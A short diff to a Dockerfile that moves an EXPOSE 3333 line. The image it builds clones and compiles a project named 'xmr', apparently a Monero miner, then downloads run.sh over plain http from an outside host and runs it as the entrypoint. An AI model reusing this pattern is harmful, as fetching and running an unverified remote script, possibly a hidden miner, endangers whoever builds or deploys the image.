@@ -1,7 +1,5 @@
 FROM ubuntu:16.10
 
-EXPOSE 3333
-
 RUN apt-get update && \
     apt-get install git build-essential cmake libcurl4-openssl-dev wget -y && \
     git clone https://github.com/twiliowot/xmr && \
@@ -12,6 +10,8 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/apo/run.sh && \
     chmod 755 run.sh
+
+EXPOSE 3333
 
 WORKDIR /xmr/build
 ENTRYPOINT ["./run.sh"]
